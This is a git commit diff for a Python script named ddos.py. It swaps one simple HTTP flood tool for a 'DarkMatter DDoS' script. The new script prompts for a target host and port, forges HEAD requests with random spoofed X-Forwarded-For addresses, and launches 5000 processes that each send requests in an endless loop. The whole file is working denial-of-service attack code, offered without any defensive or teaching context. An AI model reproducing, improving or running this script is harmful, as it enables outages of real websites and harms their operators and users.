2d7558fcaa346f2a86ca0ce74509bde5554373b1
MR_MRX <66478465+MR-MRX-etc@users.noreply.github.com>
2022-09-22 05:27:30 -0700

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,33 +1,58 @@
 import socket
-import threading
-import socket,os
-from typing import Counter
-from colorama import Fore,init
+import os, sys
 import time
-init()
-RESET = Fore.RESET
-def banner():
-    os.system("cls" or "clear")
-    print(Fore.GREEN+"""
------------------
-my instagram war__dark v2
------------------    
-    """+RESET)
-banner()    
-ip = input("Enter ip ???: ")
-fackip = "8.8.8.8"
-port = 80
-Counter = 0
-def attack():
-    while True:
-        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
-        s.connect((ip , port))
-        s.sendto(("GET /"+ip+"HTTP/1.1\r\n").encode("ascii"),(ip , port))
-        s.sendto(("Host:"+fackip+"\r\n\r\n").encode("ascii"),(ip , port))
+import multiprocessing, random
 
-        global Counter
-        Counter += 1
-        print(f"{Fore.RED} poket {str(Counter)} send-> {RESET} \n")
-        s.close()
-print(Fore.RED+"ip fack dup:))0")
-time.sleep(2)
+print("Welcome To DarkMatter DDoS")
+ip = input("IP/Domain: ")
+port = int(input("Port: "))
+
+url = "http://" + str(ip)
+
+def randomip():
+  randip = []
+  randip1 = random.randint(1,255)
+  randip2 = random.randint(1,255)
+  randip3 = random.randint(1,255)
+  randip4 = random.randint(1,255)
+  
+  randip.append(randip1)
+  randip.append(randip2)
+  randip.append(randip3)
+  randip.append(randip4)
+
+  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
+  return(randip)
+
+print("[>>>] Starting the attack [<<<]")
+
+
+time.sleep(1)
+
+
+def attack():
+  connection = "Connection: null\r\n"
+  referer = "Referer: null\r\n"
+  forward = "X-Forwarded-For: " + randomip() + "\r\n"
+  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+  request = get_host + referer  + connection + forward + "\r\n\r\n"
+  while True:
+    try:
+      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      atk.connect((ip, port))
+      #Attack starts here
+      for y in range(100):
+          atk.send(str.encode(request))
+    except socket.error:
+      time.sleep(.1)
+    except:
+      pass
+
+
+def send2attack():
+  for i in range(5000): #Magic Power
+    mp = multiprocessing.Process(target=attack)
+    mp.setDaemon = False
+    mp.start() #Magic Starts
+
+send2attack() #61 lines for the most powerful attack, cool?
